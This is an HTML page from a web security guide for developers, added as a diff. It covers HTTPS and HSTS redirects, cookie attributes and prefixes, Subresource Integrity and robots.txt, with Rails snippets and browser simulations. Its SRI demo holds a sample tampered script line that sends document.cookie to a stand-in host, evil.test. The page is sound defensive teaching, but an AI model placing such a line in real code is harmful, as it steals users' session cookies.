@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en" data-lang="rails">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>12 Transport, Cookies and Third-Party Scripts · Web Security</title>
+
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="site.webmanifest">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" href="assets/site.css?v=8f1e007517">
+<script src="assets/consent.js?v=9320b4a322"></script>
+</head>
+<body data-slug="12-transport-cookies-third-party">
+<div class="win">
+  <div class="titlebar"><span class="dots"><i></i><i></i><i></i></span><span class="t">guest@websec: ~/websec/12-transport-cookies-third-party — zsh — 100×40</span>
+    <a class="by" href="about.html" title="About the author"><span class="w0">by </span>SaKKo</a>
+    <span class="lsw" role="group" aria-label="Language"><a href="12-transport-cookies-third-party.html" aria-current="true" data-setlang="en">EN</a><a href="th/12-transport-cookies-third-party.html" data-setlang="th">TH</a></span>
+    <span class="langsw" role="group" aria-label="Code examples language"><span class="d">code:</span><button type="button" data-l="rails">rails</button><button type="button" data-l="node">node</button></span></div>
+  <nav class="top" aria-label="Sections"><a href="index.html" title="Web Security Field Guide">~/</a>
+<a class="trk on" href="index.html#security">#1 security</a>
+<a class="trk" href="r01-rails-api-app.html">#2 rails</a>
+<span class="grp">|</span>
+<a href="01-introduction.html" title="Introduction">01·introduction</a>
+<a href="02-sql-injection.html" title="SQL Injection">02·sql-injection</a>
+<a href="03-unsafe-query-generation.html" title="Unsafe Query Generation">03·query-shape</a>
+<a href="04-xss-and-other-injection.html" title="XSS and Other Injection">04·xss</a>
+<span class="grp">| accounts:</span>
+<a href="05-authentication.html" title="Authentication">05·auth</a>
+<a href="05b-mfa.html" title="Multi-Factor Authentication">05b·mfa</a>
+<a href="06-sessions.html" title="Sessions">06·sessions</a>
+<a href="07-csrf.html" title="Cross-Site Request Forgery">07·csrf</a>
+<a href="08-user-management.html" title="User Management">08·accounts</a>
+<a href="09-mass-assignment-and-authorization.html" title="Mass Assignment and Authorization">09·authz</a>
+<span class="grp">| browser:</span>
+<a href="10-redirection-and-files.html" title="Redirection and Files">10·files</a>
+<a href="11-http-security-headers.html" title="HTTP Security Headers">11·headers</a>
+<a href="12-transport-cookies-third-party.html" aria-current="page" title="Transport, Cookies and Third-Party Scripts">12·cookies-tls</a>
+<span class="grp">| server:</span>
+<a href="13-ssrf.html" title="Server-Side Request Forgery">13·ssrf</a>
+<a href="14-deserialization-and-xxe.html" title="Deserialization and XXE">14·deserialize</a>
+<a href="15-environmental-security.html" title="Environmental Security">15·secrets</a>
+<a href="16-cryptography.html" title="Cryptography and Data Protection">16·crypto</a>
+<a href="17-dependencies-and-cves.html" title="Dependencies and CVEs">17·dependencies</a>
+<span class="grp">| ops:</span>
+<a href="18-intranet-and-admin.html" title="Intranet and Admin Security">18·admin</a>
+<a href="19-misconfiguration-and-errors.html" title="Misconfiguration and Error Handling">19·misconfig</a>
+<a href="20-insecure-design.html" title="Insecure Design and Business Logic">20·design</a>
+<a href="21-logging-and-incident-response.html" title="Logging, Alerting and Incident Response">21·logging</a>
+<a href="22-additional-resources.html" title="Additional Resources">22·resources</a>
+<span class="grp">| questionnaires:</span>
+<a href="q1-developer-survey.html" title="Developer Security Survey">Q1·developer</a>
+<a href="q2-awareness-survey.html" title="Cyber Threat Awareness Survey">Q2·cyber</a></nav>
+  <main>
+<div class="col">
+<p class="prompt">guest@websec ~ % <b>man 12-transport-cookies-third-party</b></p>
+<h1>12 · Transport, Cookies and Third-Party Scripts</h1>
+<p class="lede">Browser-side hardening from Mozilla's checklist: HTTPS, cookies, and not trusting CDNs blindly.</p>
+<h2>12.1 TLS everywhere</h2>
+<p>HTTPS for every site, even "static" ones. Plain HTTP pages can be read or changed on the way.</p>
+<ul>
+<li>Use Mozilla's SSL config generator; "Intermediate" suits most sites.</li>
+<li>Auto-renew certificates.</li>
+<li>Test with SSL Labs after changes.</li>
+</ul>
+<h3>Redirects that keep HSTS working</h3>
+<p>Go HTTP → HTTPS on the same host first, then to www, so HSTS sticks. APIs: just turn HTTP off.</p>
+<div class="anim" data-actors="Browser|http://example.com|https://example.com|https://www.example.com" data-title="HTTP to HTTPS, the right way"><script type="application/json">[{"f": 0, "t": 1, "l": "GET http://example.com/", "c": "The user types the bare domain."}, {"f": 1, "t": 0, "l": "301 → https://example.com/ (same host)", "c": "First upgrade the scheme on the same host."}, {"f": 0, "t": 2, "l": "GET https://example.com/", "k": "k", "c": "Now on HTTPS for example.com."}, {"f": 2, "t": 0, "l": "Strict-Transport-Security + 301 → www", "k": "k", "c": "HSTS is set for example.com, then the redirect to the preferred host."}, {"f": 0, "t": 3, "l": "GET https://www.example.com/", "k": "k", "c": "The final host also sends HSTS. Next time, the browser goes straight to HTTPS for both."}]</script></div>
+<h3>Mixed content</h3>
+<p>One <code>http://</code> script on an HTTPS page undoes it. Load everything over HTTPS.</p>
+<div class="rp partial"><code>force_ssl</code> covers redirects and HSTS. Certificates and TLS live at the proxy, not in Rails.</div>
+<h2>12.2 Cookies: attributes and prefixes</h2>
+<p>Lock cookies down as tight as possible:</p>
+<div class="tablewrap"><table><thead><tr><th>attribute</th><th>what it does</th><th>recommendation</th></tr></thead><tbody>
+<tr><td><code>Secure</code></td><td>only sent over HTTPS</td><td>always</td></tr>
+<tr><td><code>HttpOnly</code></td><td>invisible to JavaScript (<code>document.cookie</code>)</td><td>always, unless your JS truly needs to read it</td></tr>
+<tr><td><code>SameSite</code></td><td><code>Strict</code>: never sent cross-site · <code>Lax</code>: only on top-level GET navigation · <code>None</code>: always (requires Secure)</td><td><code>Lax</code> or <code>Strict</code></td></tr>
+<tr><td><code>Domain</code></td><td>omitted = this exact host only; <code>Domain=example.com</code> = every subdomain too</td><td>omit it unless you need sharing</td></tr>
+<tr><td><code>Path</code></td><td>limits which paths receive it (weak isolation)</td><td><code>/</code> or narrower</td></tr>
+<tr><td><code>Expires</code>/<code>Max-Age</code></td><td>persistence; without it, a session cookie</td><td>short for sessions</td></tr>
+<tr><td><code>__Host-</code> prefix</td><td>browser rejects the cookie unless Secure, <code>Path=/</code> and no Domain</td><td>best for session cookies</td></tr>
+<tr><td><code>__Secure-</code> prefix</td><td>browser rejects the cookie unless Secure</td><td>for cookies that need a Domain</td></tr>
+</tbody></table></div>
+<p>Why prefixes? Without them, a forgotten subdomain an attacker takes over can overwrite your cookies. <code>__Host-</code> cookies can only come from your exact host.</p>
+<div class="demo"><header><b>sim: cookie builder</b><span>build a Set-Cookie header and get feedback</span></header><div class="body">
+<div class="grid2"><div style="display:grid;gap:6px">
+<label for="ck-name">name</label><input id="ck-name" type="text" value="__Host-session"/>
+<label><input checked="" id="ck-secure" type="checkbox"/> Secure</label>
+<label><input checked="" id="ck-httponly" type="checkbox"/> HttpOnly</label>
+<label for="ck-ss">SameSite</label><select id="ck-ss"><option>Lax</option><option>Strict</option><option>None</option><option value="">(not set)</option></select>
+<label for="ck-domain">Domain</label><input id="ck-domain" placeholder="(empty = host-only)" type="text" value=""/>
+<label for="ck-path">Path</label><input id="ck-path" type="text" value="/"/>
+</div><div><p class="cap">header</p><div class="out" id="ck-hdr"></div><p class="cap" style="margin-top:10px">review</p><div class="out" id="ck-rev"></div></div></div>
+</div></div>
+<div class="rp partial">Session cookies are already HttpOnly and Lax, and Secure once <code>force_ssl</code> is on. Rename the key to <code>__Host-myapp_session</code> for the prefix.</div><div class="code">
+<pre data-lang="rails"><span class="c"># config/initializers/session_store.rb</span>
+Rails.application.config.session_store :cookie_store, key: "__Host-myapp_session"
+
+<span class="c"># your own cookies (string key: the prefix contains "-")</span>
+cookies.encrypted["__Host-prefs"] = { value: { theme: "dark" }, httponly: true,
+                                       secure: true, same_site: :strict, expires: 30.days }</pre>
+</div>
+<h2>12.3 Third-party scripts and Subresource Integrity (SRI)</h2>
+<p>Every CDN script runs with full access to our page. If the CDN gets hacked, so do we. In 2024, <code>polyfill.io</code> changed owners and started serving malware to more than 100,000 sites.</p>
+<p><b>SRI</b> pins a script to its hash. If the file changes, the browser won't run it.</p>
+<div class="demo"><header><b>sim: SRI check</b><span>real SHA-384 in your browser</span></header><div class="body">
+<p class="hint">The page pinned the library when it was added. Then someone modifies the file on the CDN.</p>
+<div class="grid2">
+<div><label for="sri-orig">file when we pinned it</label><textarea id="sri-orig" rows="3">/*! tiny-lib v1.2.0 */ function greet(n){return "Hello "+n}</textarea>
+<div class="out" id="sri-tag" style="margin-top:8px;font-size:12px"></div></div>
+<div><label for="sri-cdn">file the CDN serves today</label><textarea id="sri-cdn" rows="3">/*! tiny-lib v1.2.0 */ function greet(n){return "Hello "+n};fetch("//evil.test/?"+document.cookie)</textarea>
+<div class="row" style="margin-top:8px"><button class="btn" id="sri-same" type="button">CDN serves the original</button><button class="btn red" id="sri-tamper" type="button">CDN compromised</button></div>
+<div class="out" id="sri-res" style="margin-top:8px"></div></div>
+</div></div></div>
+<ul>
+<li>Self-host scripts where you can.</li>
+<li>Pin versions and add SRI for CDNs.</li>
+<li>Limit script sources with CSP.</li>
+<li>Delete scripts nobody uses.</li>
+</ul>
+<div class="rp partial">Importmap and jsbundling serve JS from our own domain, which avoids this. For CDN tags, add <code>integrity:</code> and <code>crossorigin:</code>.</div>
+<h2>12.4 robots.txt is not a security control</h2>
+<p>It's public, and attackers read it first. Listing secret paths there just advertises them. Use real auth.</p>
+</div>
+
+<div class="col"><label class="readmark"><input type="checkbox" id="read-12-transport-cookies-third-party"> mark section 12 as read</label><div class="pager"><a href="11-http-security-headers.html">◀ 11 HTTP Security Headers</a><a href="13-ssrf.html">13 Server-Side Request Forgery ▶</a></div></div>
+  </main>
+  <footer class="site">Based on the <a href="https://guides.rubyonrails.org/security.html">Ruby on Rails Security Guide</a> (CC BY-SA 4.0), the <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>, the <a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> and <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla's Web Security Guidelines</a>. Written for our dev team; code samples are illustrative.</footer>
+</div>
+<script src="assets/site.js?v=92ac7aa3f8"></script>
+<script>
+
+function ck() {
+  let name = $("#ck-name").value.trim() || "session", secure = $("#ck-secure").checked, ho = $("#ck-httponly").checked, ss = $("#ck-ss").value, dom = $("#ck-domain").value.trim(), path = $("#ck-path").value.trim();
+  const parts = [`${name}=k8Fq…`]; if (path) parts.push(`Path=${path}`); if (dom) parts.push(`Domain=${dom}`); if (secure) parts.push("Secure"); if (ho) parts.push("HttpOnly"); if (ss) parts.push(`SameSite=${ss}`);
+  $("#ck-hdr").textContent = "Set-Cookie: " + parts.join("; ");
+  const r = [], bad = s => r.push('<span class="r">✗ ' + s + "</span>"), warn = s => r.push('<span class="y">! ' + s + "</span>"), ok = s => r.push('<span class="g">✓ ' + s + "</span>");
+  let rejected = false;
+  if (name.startsWith("__Host-")) { if (!secure || dom || path !== "/") { bad("browser REJECTS this cookie: __Host- requires Secure, Path=/ and no Domain"); rejected = true; } else ok("__Host- prefix: locked to this exact host over HTTPS"); }
+  else if (name.startsWith("__Secure-")) { if (!secure) { bad("browser REJECTS this cookie: __Secure- requires Secure"); rejected = true; } else ok("__Secure- prefix"); }
+  else warn("no prefix: a sibling subdomain could shadow or overwrite this cookie");
+  if (ss === "None" && !secure) { bad("SameSite=None without Secure is rejected by modern browsers"); rejected = true; }
+  if (!rejected) {
+    secure ? ok("Secure: never sent over HTTP") : bad("not Secure: leaks over any HTTP request");
+    ho ? ok("HttpOnly: XSS can't read it") : warn("readable by JavaScript: XSS can steal it");
+    ss === "Strict" || ss === "Lax" ? ok(`SameSite=${ss}: CSRF defense`) : ss === "None" ? warn("SameSite=None: sent on every cross-site request") : warn("SameSite not set: browsers default to Lax, but set it explicitly");
+    dom ? warn(`Domain=${esc(dom)}: shared with every subdomain of ${esc(dom.replace(/^\./, ""))}`) : ok("host-only (no Domain)");
+  }
+  $("#ck-rev").innerHTML = r.join("\n");
+}
+["#ck-name", "#ck-domain", "#ck-path"].forEach(s => $(s).addEventListener("input", ck)); ["#ck-secure", "#ck-httponly", "#ck-ss"].forEach(s => $(s).addEventListener("change", ck)); ck();
+async function sha384(t) { const b = await crypto.subtle.digest("SHA-384", new TextEncoder().encode(t)); return "sha384-" + btoa(String.fromCharCode(...new Uint8Array(b))); }
+async function sriPin() { const h = await sha384($("#sri-orig").value); $("#sri-tag").innerHTML = esc(`<script src="https://cdn.example/tiny-lib@1.2.0.js"\n  integrity="${h}"\n  crossorigin="anonymous"><\/script>`); return h; }
+async function sriCheck(served) { const pin = await sriPin(), got = await sha384(served); $("#sri-res").innerHTML = `downloaded file hash:\n${got.slice(0, 40)}…\n` + (got === pin ? '<span class="g">matches integrity → script runs</span>' : '<span class="g">does NOT match integrity → browser refuses to execute it. Site stays safe (that feature breaks until you fix it).</span>\n<span class="d">without SRI, the modified script would run on every page.</span>'); }
+$("#sri-same").onclick = () => { $("#sri-cdn").value = $("#sri-orig").value; sriCheck($("#sri-cdn").value); };
+$("#sri-tamper").onclick = () => sriCheck($("#sri-cdn").value);
+$("#sri-orig").addEventListener("input", () => sriCheck($("#sri-cdn").value)); $("#sri-cdn").addEventListener("input", () => sriCheck($("#sri-cdn").value));
+sriCheck($("#sri-cdn").value);
+
+</script>
+</body>
+</html>
